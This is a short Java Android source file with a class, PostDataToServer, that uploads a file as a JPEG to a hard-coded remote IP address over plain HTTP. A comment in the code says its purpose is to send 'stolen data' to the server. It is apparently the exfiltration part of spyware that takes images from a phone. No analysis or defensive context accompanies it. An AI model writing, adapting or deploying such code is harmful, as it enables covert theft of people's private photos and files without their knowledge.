package com.example.myapplication;

import android.os.AsyncTask;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PostDataToServer extends AsyncTask<File, Void, String> {
    // This thread's goal is to send the stolen data to the server.
    OkHttpClient client = new OkHttpClient();

    @Override
    protected String doInBackground(File... files) {
        // Create an body, contain an image.
        RequestBody body = new MultipartBody.Builder() // Create the body msg.
                .setType(MultipartBody.FORM)
                .addFormDataPart("image", files[0].getName(),
                        RequestBody.create(MediaType.parse("image/jpeg"),files[0]))
                .build();
        // create an request to the server with the postfix upload/image
        Request request = new Request.Builder() // Create the request with the body above.
                .url("http://35.234.68.144/upload/image")
                .post(body)
                .build();

        //Check the response
        try (Response response = client.newCall(request).execute()) {
            return response.body().string();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
